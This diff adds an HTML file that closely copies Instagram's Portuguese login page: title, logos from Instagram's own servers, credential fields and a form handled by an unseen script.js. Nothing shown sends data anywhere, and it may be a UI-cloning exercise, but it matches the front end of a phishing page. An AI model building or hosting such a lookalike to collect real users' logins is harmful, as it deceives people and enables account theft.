@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Instagram</title>
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="login-card">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
+            </div>
+
+            <form id="instaForm">
+                <div class="input-field">
+                    <input type="text" id="user" required placeholder=" ">
+                    <label>Telefone, nome de usuário ou email</label>
+                </div>
+                <div class="input-field">
+                    <input type="password" id="pass" required placeholder=" ">
+                    <label>Senha</label>
+                </div>
+                
+                <button type="submit" class="login-btn" id="loginBtn" disabled>Entrar</button>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <span>OU</span>
+                    <div class="line"></div>
+                </div>
+
+                <div class="fb-container">
+                    <button type="button" class="fb-btn">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%282013%29.svg" alt="FB">
+                        Entrar com o Facebook
+                    </button>
+                </div>
+
+                <a href="#" class="forgot-link">Esqueceu a senha?</a>
+            </form>
+        </div>
+
+        <div class="signup-card">
+            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+
+        <div class="apps-section">
+            <p>Obtenha o aplicativo.</p>
+            <div class="app-links">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Y2_0i_Yf9vV.png" alt="Google Play">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym_f0n.png" alt="Microsoft">
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
